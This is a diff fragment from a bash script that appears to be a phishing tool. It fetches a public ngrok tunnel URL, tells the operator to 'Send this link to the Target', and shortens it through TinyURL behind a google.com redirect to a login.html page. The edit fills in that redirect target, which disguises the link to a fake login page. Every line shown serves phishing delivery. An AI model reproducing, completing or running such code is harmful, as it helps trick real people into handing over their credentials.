@@ -478,7 +478,7 @@ sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
-send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.google.com/redirect?v=   -fqU" | head -n1)
+send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.google.com/redirect?v=login.html -fqU" | head -n1)
 #send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
